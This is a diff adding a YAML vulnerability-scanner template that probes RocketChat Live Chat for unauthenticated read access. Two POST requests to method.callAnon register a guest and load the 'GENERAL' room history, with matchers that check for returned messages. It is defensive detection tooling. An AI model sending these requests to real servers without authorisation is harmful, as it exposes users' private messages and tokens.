@@ -1,0 +1,47 @@
+id: rocketchat-unauth-access
+brief:
+    title: RocketChat Live Chat - Unauthenticated Read Access
+    by: rojanrijal
+    level: high
+    about: RocketChat Live Chat accepts invalid parameters that could potentially allow unauthenticated access to messages and user tokens.
+    label:
+        - rocketchat
+        - unauth
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/v1/method.callAnon/cve_exploit'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Content-Type: application/json
+        Origin: '{{BaseURL}}'
+      body: '{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"{{value}}\",\"name\":\"cve-2020-{{value}}\",\"email\":\"{{user_email}}\"}],\"id\":\"123\"}"}'
+      signs:
+        - "on": word
+          has:
+            - '"{\"msg\":\"result\",\"result\":{\"messages\"'
+            - '"success":true'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/v1/method.callAnon/cve_exploit'
+      head:
+        Content-Type: application/json
+        Origin: '{{BaseURL}}'
+      body: '{"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"{{value}}\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}'
+      signs:
+        - "on": word
+          has:
+            - '"{\"msg\":\"result\",\"result\":{\"messages\"'
+            - '"success":true'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
